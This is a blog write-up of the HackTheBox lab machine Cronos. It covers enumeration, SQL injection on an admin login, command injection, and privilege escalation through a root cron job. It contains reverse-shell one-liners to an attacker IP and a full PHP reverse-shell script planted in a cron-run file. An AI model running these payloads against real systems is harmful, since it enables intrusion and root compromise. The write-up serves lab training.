<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Cronos | PwndSide</title>
<meta name=keywords content="privesc,web,linux"><meta name=description content="Linux machine with a website which has virtual hosting, as first vulnerabilty we found a login page with SQLi and a command injection which makes us achieve the RCE. The privesc in this machine takes place on a cronjob."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/cronos-htb/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Cronos"><meta property="og:description" content="Linux machine with a website which has virtual hosting, as first vulnerabilty we found a login page with SQLi and a command injection which makes us achieve the RCE. The privesc in this machine takes place on a cronjob."><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/cronos-htb/"><meta property="og:image" content="http://localhost:1313/%3Cimage%20path/url%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-07-26T13:53:53+02:00"><meta property="article:modified_time" content="2023-07-26T13:53:53+02:00"><meta property="og:site_name" content="PwndSide"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Cimage%20path/url%3E"><meta name=twitter:title content="Cronos"><meta name=twitter:description content="Linux machine with a website which has virtual hosting, as first vulnerabilty we found a login page with SQLi and a command injection which makes us achieve the RCE. The privesc in this machine takes place on a cronjob."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"Cronos","item":"http://localhost:1313/posts/cronos-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Cronos","name":"Cronos","description":"Linux machine with a website which has virtual hosting, as first vulnerabilty we found a login page with SQLi and a command injection which makes us achieve the RCE. The privesc in this machine takes place on a cronjob.","keywords":["privesc","web","linux"],"articleBody":"Room Information Room name: Cronos Difficulty level: Medium Room link: https://app.hackthebox.com/machines/cronos Tools Used nmap gobuster ffuf Port Scanning sudo nmap $IP -n -Pn -vvv --min-rate 5000 36 │ PORT STATE SERVICE REASON VERSION 37 │ 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ub │ untu Linux; protocol 2.0) 38 │ | ssh-hostkey: 39 │ | 2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA) 40 │ | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEq │ yHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJC │ qV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9Ka │ yOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEg │ Mycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwG │ qjIvWnTzXLL8TilZI6/PV8wPHzn 41 │ | 256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA) 42 │ | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAA │ ABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6 │ eaxkgW6NBgBEggm3kfQ= 43 │ | 256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519) 44 │ |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnO │ DXvxQ1Dc+Zx 45 │ 53/tcp open domain syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux) 46 │ | dns-nsid: 47 │ |_ bind.version: 9.10.3-P4-Ubuntu 48 │ 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) 49 │ |_http-title: Apache2 Ubuntu Default Page: It works 50 │ |_http-server-header: Apache/2.4.18 (Ubuntu) 51 │ | http-methods: 52 │ |_ Supported Methods: GET HEAD POST OPTIONS 53 │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We have three open ports, the port 22 with a ssh up and running, the port 53 with a ISC BIND and a http web page at the port 80.\nEnumeration As always we are goin to focus on the webpage.\nIf we enter at the page we can observe Ubuntu Default Page and if we try to fuzz this page nothing helpful is found.\nIt’s seems that maybe there is virtual hosting at the http server but nmap doesn’t show any domain. One thing we can perform is a nslookup to the ip which help us to find the domain which the ip points.\nnslookup \u003e server 10.10.10.13 Default server: 10.10.10.13 Address: 10.10.10.13#53 \u003e 10.10.10.13 Server:\t10.10.10.13 Address:\t10.10.10.13#53 13.10.10.10.in-addr.arpa\tname = ns1.cronos.htb. We found a cronos.htb domain, let’s put cronos.htb on the etc/hosts directory in order to take a look a the website hosted there.\nThere are four links which point to websites out of our scope so there are not useful. Let’s do a quick fuzz.\ngobuster dir -u http://cronos.htb/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,sh,txt -o fuzz | tee fuzz.save =============================================================== 2023/07/25 15:37:15 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 289] /.html (Status: 403) [Size: 290] /.hta (Status: 403) [Size: 289] /.hta.css (Status: 403) [Size: 293] /.hta.js (Status: 403) [Size: 292] /.hta.py (Status: 403) [Size: 292] /.hta.sh (Status: 403) [Size: 292] /.hta.php (Status: 403) [Size: 293] /.hta.txt (Status: 403) [Size: 293] /.hta.html (Status: 403) [Size: 294] /.htaccess (Status: 403) [Size: 294] /.htaccess.php (Status: 403) [Size: 298] /.htaccess.html (Status: 403) [Size: 299] /.htaccess.js (Status: 403) [Size: 297] /.htaccess.py (Status: 403) [Size: 297] /.htaccess.css (Status: 403) [Size: 298] /.htaccess.sh (Status: 403) [Size: 297] /.htaccess.txt (Status: 403) [Size: 298] /.htpasswd (Status: 403) [Size: 294] /.htpasswd.txt (Status: 403) [Size: 298] /.htpasswd.php (Status: 403) [Size: 298] /.htpasswd.html (Status: 403) [Size: 299] /.htpasswd.css (Status: 403) [Size: 298] /.htpasswd.js (Status: 403) [Size: 297] /.htpasswd.py (Status: 403) [Size: 297] /.htpasswd.sh (Status: 403) [Size: 297] /css (Status: 301) [Size: 306] [--\u003e http://cronos.htb/css/] /favicon.ico (Status: 200) [Size: 0] /index.php (Status: 200) [Size: 2319] /index.php (Status: 200) [Size: 2319] Progress: 16446 / 36920 (44.54%) /js (Status: 301) [Size: 305] [--\u003e http://cronos.htb/js/] /robots.txt (Status: 200) [Size: 24] /robots.txt (Status: 200) [Size: 24] /server-status (Status: 403) [Size: 298] /web.config (Status: 200) [Size: 914] Progress: 36904 / 36920 (99.96%) =============================================================== 2023/07/25 15:43:27 Finished =============================================================== The results are worthless, so the only thing we can do is to see if there are more virtual hosts with ffuf.\nFirst I started without the -fw flag, and I see that the default responses have always 3534 words\nffuf -u http://10.10.10.13 -H \"Host: FUZZ.cronos.htb\" -w ~/Documents/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -fw 3534 -o vhost | tee vhost.save 1 │ [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 121ms] 2 │ * FUZZ: www 3 │ 4 │ [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 2196ms] 5 │ * FUZZ: admin As the results shows admin, let’s see what we have at admin.cronos.htb but before we need to put it at etc/hosts file\nIt’s a login page and seems so bad constructed\nExploiting First I am going to try the common credentials but nothing is working.\nThe login page seem pretty vulnerable to SQLi so I tried a very simple injection\nWe have gain access as admin.\nOnce inside, we found a text box to execute ping or traceroute commands in the remote machine.\nThis smells like command injection, so I tried to put commands between two semicolons in order to execute them in the remote machine.\nNow, let’s set a nc listener and send a simple reverse shell with nc.\nnc -e /bin/sh 10.10.14.20 4444 nc -lv 4444 This way doesn’t seem to work so maybe we are in front a older linux version. Let’s us this command instead.\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.14.20 4444 \u003e/tmp/f Gaining an Initial Foothold We are in now, let’s find the user’s flag\nEscalating Privilege I tried to enumerate de sudo -l privileges but a password is requested.\nOther thing we can do is to search for SUID files but before that I realized that maybe the thing which are going to let me privesc is a cron job because the machine name gives us a clue of that. So I build a bash script that help us to monitorize this type of scheduled tasks.\n#!/bin/bash old_process=$(ps -eo command) while true; do new_process=$(ps -eo command) diff \u003c(echo \"$old_process\") \u003c(echo \"$new_process\") | grep \"[\\\u003c\\\u003e\\]\" | grep -v \"Apple\" old_process=$new_process done This script help us to see what scheduled processes are running on the background.\n\u003c [moniProc.sh] \u003c [moniProc.sh] \u003c [moniProc.sh] \u003c [moniProc.sh] \u003e /usr/sbin/CRON -f \u003e /bin/sh -c php /var/www/laravel/artisan schedule:run \u003e\u003e /dev/null 2\u003e\u00261 \u003e php /var/www/laravel/artisan schedule:run \u003c /usr/sbin/CRON -f \u003c /bin/sh -c php /var/www/laravel/artisan schedule:run \u003e\u003e /dev/null 2\u003e\u00261 \u003c php /var/www/laravel/artisan schedule:run \u003c [kworker/u2:30] \u003c [kworker/u2:3] \u003c [kworker/u2:4] Once executed the script we can see that the cron job is executing the following command\n/bin/sh -c php /var/www/laravel/artisan schedule:run \u003e\u003e /dev/null 2\u003e\u00261 This bash command is running php file at the laravel directory, as we know the cron jobs are executed as root so we only need to change the content of the artisan file in order to put a php-reverse-shell.\n\u003c?php set_time_limit (0); $VERSION = \"1.0\"; $ip = '10.10.14.20'; // CHANGE THIS $port = 4445; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0; // // Daemonise ourself if possible to avoid zombies later // // pcntl_fork is hardly ever available, but will allow us to daemonise // our php process and avoid zombies. Worth a try... if (function_exists('pcntl_fork')) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) { printit(\"ERROR: Can't fork\"); exit(1); } if ($pid) { exit(0); // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); } $daemon = 1; } else { printit(\"WARNING: Failed to daemonise. This is quite common and not fatal.\"); } // Change to a safe directory chdir(\"/\"); // Remove any umask we inherited umask(0); // // Do the reverse shell... // // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\"$errstr ($errno)\"); exit(1); } // Spawn shell process $descriptorspec = array( 0 =\u003e array(\"pipe\", \"r\"), // stdin is a pipe that the child will read from 1 =\u003e array(\"pipe\", \"w\"), // stdout is a pipe that the child will write to 2 =\u003e array(\"pipe\", \"w\") // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } // Set everything to non-blocking // Reason: Occsionally reads will block, even though stream_select tells us they won't stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { // Check for end of TCP connection if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } // Check for end of STDOUT if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process's STDIN if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } // If we can read from the process's STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } // If we can read from the process's STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); // Like print, but does nothing if we've daemonised ourself // (I can't figure out how to redirect STDOUT like a proper daemon) function printit ($string) { if (!$daemon) { print \"$string\\n\"; } } ?\u003e We need to change the ip and the port to our listening ports.\nNow only rests to set a listener and wait until the cronjob is executed.\nnc -lv 4445 Let’s cat the root’s flag\nThank you for reading, and happy hacking! 😄\n","wordCount":"1583","inLanguage":"en","image":"http://localhost:1313/%3Cimage%20path/url%3E","datePublished":"2023-07-26T13:53:53+02:00","dateModified":"2023-07-26T13:53:53+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/cronos-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="PwndSide (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=http://localhost:1313/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=http://localhost:1313/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Cronos</h1><div class=post-description>Linux machine with a website which has virtual hosting, as first vulnerabilty we found a login page with SQLi and a command injection which makes us achieve the RCE. The privesc in this machine takes place on a cronjob.</div><div class=post-meta><span title='2023-07-26 13:53:53 +0200 CEST'>July 26, 2023</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1583 words&nbsp;·&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/cronos-htb.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploiting>Exploiting</a></li><li><a href=#gaining-an-initial-foothold>Gaining an Initial Foothold</a></li><li><a href=#escalating-privilege>Escalating Privilege</a></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: Cronos</li><li>Difficulty level: Medium</li><li>Room link: <a href=https://app.hackthebox.com/machines/cronos>https://app.hackthebox.com/machines/cronos</a></li></ul><p><img loading=lazy src=/HTB/cronos-icon.png alt=Untitled></p><h2 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h2><ul><li>nmap</li><li>gobuster</li><li>ffuf</li></ul><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap <span class=nv>$IP</span> -n -Pn -vvv --min-rate <span class=m>5000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>  <span class=m>36</span>   │ PORT   STATE SERVICE REASON         VERSION
</span></span><span class=line><span class=cl>  <span class=m>37</span>   │ 22/tcp open  ssh     syn-ack ttl <span class=m>63</span> OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span class=o>(</span>Ub
</span></span><span class=line><span class=cl>       │ untu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=m>38</span>   │ <span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl>  <span class=m>39</span>   │ <span class=p>|</span>   <span class=m>2048</span> 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=m>40</span>   │ <span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEq
</span></span><span class=line><span class=cl>       │ yHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJC
</span></span><span class=line><span class=cl>       │ qV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9Ka
</span></span><span class=line><span class=cl>       │ yOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEg
</span></span><span class=line><span class=cl>       │ Mycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwG
</span></span><span class=line><span class=cl>       │ qjIvWnTzXLL8TilZI6/PV8wPHzn
</span></span><span class=line><span class=cl>  <span class=m>41</span>   │ <span class=p>|</span>   <span class=m>256</span> 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=m>42</span>   │ <span class=p>|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAA
</span></span><span class=line><span class=cl>       │ ABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6
</span></span><span class=line><span class=cl>       │ <span class=nv>eaxkgW6NBgBEggm3kfQ</span><span class=o>=</span>
</span></span><span class=line><span class=cl>  <span class=m>43</span>   │ <span class=p>|</span>   <span class=m>256</span> 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=m>44</span>   │ <span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnO
</span></span><span class=line><span class=cl>       │ DXvxQ1Dc+Zx
</span></span><span class=line><span class=cl>  <span class=m>45</span>   │ 53/tcp open  domain  syn-ack ttl <span class=m>63</span> ISC BIND 9.10.3-P4 <span class=o>(</span>Ubuntu Linux<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=m>46</span>   │ <span class=p>|</span> dns-nsid:
</span></span><span class=line><span class=cl>  <span class=m>47</span>   │ <span class=p>|</span>_  bind.version: 9.10.3-P4-Ubuntu
</span></span><span class=line><span class=cl>  <span class=m>48</span>   │ 80/tcp open  http    syn-ack ttl <span class=m>63</span> Apache httpd 2.4.18 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl>  <span class=m>49</span>   │ <span class=p>|</span>_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span class=line><span class=cl>  <span class=m>50</span>   │ <span class=p>|</span>_http-server-header: Apache/2.4.18 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=m>51</span>   │ <span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl>  <span class=m>52</span>   │ <span class=p>|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl>  <span class=m>53</span>   │ Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>We have three open ports, the <strong>port 22</strong> with a <strong>ssh</strong> up and running, the <strong>port 53</strong> with a <strong>ISC BIND</strong> and a <strong>http</strong> web page at the <strong>port 80</strong>.</p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p>As always we are goin to focus on the webpage.</p><p><img loading=lazy src=/HTB/cronos-1.png alt=Untitled></p><p>If we enter at the page we can observe Ubuntu Default Page and if we try to fuzz this page nothing helpful is found.</p><p>It’s seems that maybe there is virtual hosting at the http server but nmap doesn’t show any domain. One thing we can perform is a nslookup to the ip which help us to find the domain which the ip points.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nslookup
</span></span><span class=line><span class=cl>&gt; server 10.10.10.13
</span></span><span class=line><span class=cl>Default server: 10.10.10.13
</span></span><span class=line><span class=cl>Address: 10.10.10.13#53
</span></span><span class=line><span class=cl>&gt; 10.10.10.13
</span></span><span class=line><span class=cl>Server:		10.10.10.13
</span></span><span class=line><span class=cl>Address:	10.10.10.13#53
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>13.10.10.10.in-addr.arpa	<span class=nv>name</span> <span class=o>=</span> ns1.cronos.htb.
</span></span></code></pre></div><p>We found a <code>cronos.htb</code> domain, let’s put <code>cronos.htb</code> on the <code>etc/hosts</code> directory in order to take a look a the website hosted there.</p><p><img loading=lazy src=/HTB/cronos-2.png alt=Untitled></p><p>There are four links which point to websites out of our scope so there are not useful. Let’s do a quick fuzz.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://cronos.htb/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,sh,txt -o fuzz <span class=p>|</span> tee fuzz.save
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/07/25 15:37:15 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/.php                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 289<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 290<span class=o>]</span>
</span></span><span class=line><span class=cl>/.hta                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 289<span class=o>]</span>
</span></span><span class=line><span class=cl>/.hta.css             <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 293<span class=o>]</span>
</span></span><span class=line><span class=cl>/.hta.js              <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 292<span class=o>]</span>
</span></span><span class=line><span class=cl>/.hta.py              <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 292<span class=o>]</span>
</span></span><span class=line><span class=cl>/.hta.sh              <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 292<span class=o>]</span>
</span></span><span class=line><span class=cl>/.hta.php             <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 293<span class=o>]</span>
</span></span><span class=line><span class=cl>/.hta.txt             <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 293<span class=o>]</span>
</span></span><span class=line><span class=cl>/.hta.html            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 294<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htaccess            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 294<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htaccess.php        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htaccess.html       <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 299<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htaccess.js         <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 297<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htaccess.py         <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 297<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htaccess.css        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htaccess.sh         <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 297<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htaccess.txt        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswd            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 294<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswd.txt        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswd.php        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswd.html       <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 299<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswd.css        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswd.js         <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 297<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswd.py         <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 297<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswd.sh         <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 297<span class=o>]</span>
